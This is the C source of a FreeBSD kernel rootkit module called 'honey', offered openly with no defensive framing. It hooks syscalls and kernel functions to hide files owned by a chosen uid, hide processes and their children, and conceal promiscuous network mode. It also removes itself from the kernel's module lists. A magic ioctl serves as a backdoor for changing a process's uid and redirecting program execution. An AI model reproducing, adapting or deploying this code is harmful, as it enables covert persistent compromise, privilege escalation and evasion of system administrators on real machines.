/*
 * 7350 freebsd kernel module
 *
 * z
 */

#include <sys/param.h>
#include <sys/systm.h>
#include <sys/kernel.h>
#include <sys/module.h>
#include <sys/conf.h>
#include <sys/proc.h>
#include <sys/syscall.h>
#include <sys/sysent.h>
#include <sys/sysproto.h>
#include <sys/sysctl.h>
#include <sys/ioccom.h>
#include <sys/unistd.h>
#include <sys/vnode.h>
#include <sys/imgact.h>
#include <sys/namei.h>
#include <sys/queue.h>
#include <sys/malloc.h>
#include <sys/linker.h>
#include <sys/lock.h>
#include <sys/socket.h>
#include <net/if.h>
#include <net/if_var.h>
#include "config.h"

struct hijack;

static int evil_ioctl __P((struct proc *, struct ioctl_args *));
static int evil_fork1 __P((struct proc *, int, struct proc **));
static int evil_out_proc __P((struct proc *, struct sysctl_req *, int));
static int evil_execve __P((struct proc *, struct execve_args *));
static int evil_namei __P((struct nameidata *));
static int evil_lookup __P((struct nameidata *));
static int evil_ifpromisc __P((struct ifnet *, int));
static void hijack_do __P((struct hijack *));
static void hijack_undo __P((struct hijack *));
static int honey_modevent __P((module_t, int, void *));
static void pid_command __P((o2_args *));
static int redir_command __P((o2_args *));

extern int ifpromisc __P((struct ifnet *, int));

struct execve_redir {
	TAILQ_ENTRY(execve_redir) entries;
	char			from[50];
	char			to[50];
};

TAILQ_HEAD(execve_redir_head, execve_redir);

struct execve_redir_head	execve_redir_head;

#define hijack_none 0x0
#define hijack_sys 0x1
#define hijack_func 0x2

struct hijack {
	int			type;
	int			on;
	int			start;
	union {
		int		syscall;
		void		*func;
	} i;
	void			*new_func;
	void			*old_func;
	char			bytes[7];
};

char jumpoff[]="\xb8\x41\x41\x41\x41\xff\xe0";

extern int sysctl_out_proc __P((struct proc *, struct sysctl_req *, int));

#define hijack_ioctl 0x0
#define hijack_proc 0x1
#define hijack_fork 0x2
#define hijack_lookup 0x3
#define hijack_execve 0x4
#define hijack_namei 0x5
#define hijack_ifpromisc 0x6

struct hijack hijacks[]= {
	{hijack_sys, 0, 1, {SYS_ioctl}, evil_ioctl, 0},
	{hijack_func, 0, 1, {sysctl_out_proc}, evil_out_proc, 0},
	{hijack_func, 0, 1, {fork1}, evil_fork1, 0},
	{hijack_func, 0, 1, {lookup}, evil_lookup, 0},
	{hijack_sys, 0, 1, {SYS_execve}, evil_execve, 0},
	{hijack_func, 0, 0, {namei}, evil_namei, 0},
	{hijack_ifpromisc, 0, 0, {ifpromisc}, evil_ifpromisc, 0},
	{NULL, 0, 0, {NULL}, NULL, NULL},
};

#define P_HIDDEN 0x8000000

static int
evil_ifpromisc (ifp, pswitch)
	struct ifnet		*ifp;
	int			pswitch;
{
	int			ret;

	hijack_undo(&hijacks[hijack_ifpromisc]);

	ifp->if_pcount++;

	ret = ifpromisc (ifp, pswitch);

	ifp->if_pcount--;

	return (ret);
}                           

static int
evil_lookup (ndp)
	struct nameidata	*ndp;
{
	register int		ret;
	struct vattr		attr;

	hijack_undo(&hijacks[hijack_lookup]);
	ret = lookup (ndp);
	hijack_do(&hijacks[hijack_lookup]);

	if (ret != 0 || ndp->ni_vp == 0)
		return (ret);

	if (VOP_GETATTR (ndp->ni_vp, &attr, VNOVAL, ndp->ni_cnd.cn_proc))
		return (ret);

	if (attr.va_uid != EVIL_UID)
		return (ret);

	/* hide the crap now */

	if (ndp->ni_cnd.cn_flags & LOCKLEAF && ndp->ni_vp) {
		vput (ndp->ni_vp);
		ndp->ni_vp = NULL;
	}

	if (ndp->ni_cnd.cn_flags & LOCKPARENT && ndp->ni_dvp) {
		vput (ndp->ni_dvp);
		ndp->ni_dvp = NULL;
	}

	return (ENOENT);
}

/* to redirect execve we hook namei only when execve is called */

static int
evil_namei (ndp)
	struct nameidata	*ndp;
{
	char			mybuf[MAXPATHLEN];
	int			done;
	struct execve_redir	*ptr;
	
	hijack_undo(&hijacks[hijack_namei]);

	if (ndp->ni_segflg != UIO_USERSPACE)
		goto out;

	if (copyinstr (ndp->ni_dirp, mybuf, MAXPATHLEN, &done))
		goto out;

	TAILQ_FOREACH(ptr, &execve_redir_head, entries) {
		if (strcmp (ptr->from, ndp->ni_dirp))
			continue;
		/* it matches.. */

		ndp->ni_dirp = ptr->to;
		ndp->ni_segflg = UIO_SYSSPACE;
		break;
	}
out:
	return (namei (ndp));
}

static int
evil_execve (p, uap)
	struct proc		*p;
	struct execve_args	*uap;
{
	hijack_do(&hijacks[hijack_namei]);
	return (execve (p, uap));
}

static int
evil_out_proc (p, req, doingzomb)
	struct proc		*p;
	struct sysctl_req	*req;
	int			doingzomb;
{
	int			res;

	if ((p->p_flag & P_HIDDEN) && !(req->p->p_flag & P_HIDDEN))
		return (0);

	hijack_undo (&hijacks[hijack_proc]);
	res = sysctl_out_proc (p, req, doingzomb);
	hijack_do (&hijacks[hijack_proc]);

	return (res);
}
 
/* evil ioctl algorithm
 *
 * the way i do this is trojan an existing ioctl such that our evil ioctl
 * is only triggered if the structure contains certain data
 */

static void
pid_command (args)
	o2_args			*args;
{
	struct proc		*p;

	args->res = 1;
	p = pfind (args->args[0]);
	if (p == NULL)
		return;

	switch (args->args[1]) {
	case PID_UID:
		p->p_cred->p_ruid = args->args[2];
		break;
	case PID_HIDE:
		p->p_flag |= P_HIDDEN;
		break;
	case PID_UNHIDE:
		p->p_flag &= ~P_HIDDEN;
		break;
	}

	return;
}

static int
redir_command (args)
	o2_args			*args;
{
	struct execve_redir	*ptr;
	unsigned int		done, cnt = 0;
	caddr_t			addr;

	args->res = 1;

	switch (args->args[0]) {
	case REDIR_ADD:
		ptr = malloc(sizeof(*ptr), M_TEMP, M_WAITOK);
		if (!ptr)
			return (-1);
		if (copyinstr((void *)args->args[1], ptr->from, 50, &done)) {
			free (ptr, M_TEMP);
			return (-1);
		}
		
		if (copyinstr((void *)args->args[2], ptr->to, 50, &done)) {
			free(ptr, M_TEMP);
			return (-1);
		}
		TAILQ_INSERT_TAIL (&execve_redir_head, ptr, entries);
		args->res = 0;
		break;

	case REDIR_RM:
		cnt = args->args[1] - 1;
		if (cnt > 10)
			return (-1);

		ptr = TAILQ_FIRST(&execve_redir_head);
		if (!ptr)
			return (-1);

		while (cnt-- && ptr) {
			ptr = TAILQ_NEXT(ptr, entries); 
			if (!ptr)
				return (-1);
		}
		TAILQ_REMOVE(&execve_redir_head, ptr, entries);
		free (ptr, M_TEMP);
		break;

	case REDIR_LIST:
		ptr = TAILQ_FIRST(&execve_redir_head);
		addr = (caddr_t)args->args[1];

		while (cnt < 10 && ptr) {
			++cnt;
			
			if (copyout (ptr->from, addr, strlen(ptr->from)+1)) {
				return (-1);
			}
			addr += strlen(ptr->from) + 1;
			if (copyout (ptr->to, addr, strlen(ptr->to)+1)) {
				return (-1);
			}
			addr += strlen(ptr->to) + 1;
			ptr = TAILQ_NEXT(ptr, entries);
		}
		if (copyout ("", addr, 1))
			return (-1);
		break;
	}
	args->res = 0;

	return (0);
}

static int
evil_ioctl (p, uap)
	struct proc		*p;
	struct ioctl_args	*uap;
{
	unsigned char		buf[8];
	o2_args			args;
	caddr_t			addr;

	if (uap->com == EVIL_IOCTL_COMMAND) {
		if (copyin (uap->data, buf, 8))
			goto out;
		if (memcmp(buf, EVIL_IOCTL_MAGIC, 4))
			goto out;
		addr = (caddr_t)*(unsigned long *)(buf + 4);
		if (copyin (addr, &args, sizeof(o2_args)))
			goto out;
		switch (args.command) {
		case PING_COMMAND:
			args.res = 0;
			break;
		case PID_COMMAND:
			pid_command (&args);
			break;
		case REDIR_COMMAND:
			redir_command (&args);
			break;
		case IFPROMISC_COMMAND:
			hijack_do(&hijacks[hijack_ifpromisc]);
			break;
		}
		copyout (&args, addr, sizeof(o2_args));
	}
out:
	return (ioctl (p, uap));
}

int
evil_fork1 (p, flags, procp)
	struct proc 		*p;
	int			flags;
	struct proc		**procp;
{
	int			error;

	hijack_undo (&hijacks[hijack_fork]);
	error = fork1 (p, flags, procp);
	hijack_do (&hijacks[hijack_fork]); 

	if (error == 0 && (p->p_flag & P_HIDDEN))
		(*procp)->p_flag |= P_HIDDEN;

	return error;
}

static void
hijack_do (ptr)
	struct hijack 		*ptr;
{
	if (ptr->on != 0)
		return;

	switch (ptr->type) {
	case hijack_sys:
		ptr->on = 1;
		ptr->old_func = (void *)sysent[ptr->i.syscall].sy_call;
		sysent[ptr->i.syscall].sy_call = ptr->new_func;
		break;
	case hijack_func:
		ptr->on = 1;
		ptr->old_func = ptr->i.func;
		*(unsigned long *)(jumpoff+1) = (unsigned long)ptr->new_func;
		memcpy (ptr->bytes, ptr->old_func, 7);
		memcpy (ptr->old_func, jumpoff, 7);
		break;
	}
}

static void
hijack_undo (ptr)
	struct hijack		*ptr;
{
	if (ptr->on != 1)
		return;

	switch (ptr->type) {
	case hijack_sys:
		sysent[ptr->i.syscall].sy_call = (sy_call_t *)ptr->old_func;
		ptr->on = 0;
		break;
	case hijack_func:
		ptr->on = 0;
		memcpy (ptr->old_func, ptr->bytes, 7);
		break;
	}
}

static void
hijack_init (void)
{
	struct hijack		*ptr;

	for (ptr = hijacks; ptr->new_func; ptr++) {
		if (ptr->start)
			hijack_do (ptr);
	}
}

static void
hijack_fini (void)
{
	struct hijack		*ptr;

	for (ptr = hijacks; ptr->new_func; ptr++) {
		hijack_undo (ptr);
	}
}

/* ripped from adorebsd */
typedef TAILQ_HEAD(, module) modulelist_t;                                      
extern linker_file_list_t linker_files;
extern int next_file_id;
extern modulelist_t modules;
extern int nextid;
extern struct lock lock;

struct module {
  TAILQ_ENTRY(module) link;
  TAILQ_ENTRY(module) flink;
  struct linker_file *file;
  int refs;
  int id;
  char *name;
  modeventhand_t handler;
  void *arg;
  modspecific_t data;
};

void
hide_ourselves (void)
{
	linker_file_t		lf = NULL;
	module_t		mod = NULL;		

	lockmgr(&lock, LK_SHARED, 0, curproc);

	(&linker_files)->tqh_first->refs--;
	for(lf = (&linker_files)->tqh_first; lf; lf = (lf)->link.tqe_next) {
	if(strcmp(lf->filename, "honey.ko") == 0) {
		next_file_id--;
		if(((lf)->link.tqe_next) != NULL)
			(lf)->link.tqe_next->link.tqe_prev = (lf)->link.tqe_prev;
		else
			(&linker_files)->tqh_last = (lf)->link.tqe_prev;
		*(lf)->link.tqe_prev = (lf)->link.tqe_next;
		break;
	}
	}

	lockmgr(&lock, LK_RELEASE, 0, curproc);
	for(mod = TAILQ_FIRST(&modules); mod; mod = TAILQ_NEXT(mod, link)) {
		if(!strcmp(mod->name, "honey")) {
			nextid--;
			TAILQ_REMOVE(&modules, mod, link);
		}
	}
}

static int
honey_modevent (mod, type, data)
	module_t		mod;
	int			type;
	void *			data;
{
	switch (type) {
	case MOD_LOAD:
		hide_ourselves();
		hijack_init ();
		TAILQ_INIT(&execve_redir_head);
		break;
	case MOD_UNLOAD:
		hijack_fini ();
		break;
	}

	return (0);
}

DEV_MODULE(honey, honey_modevent, NULL);

/*
 * vim: ts=8
 */
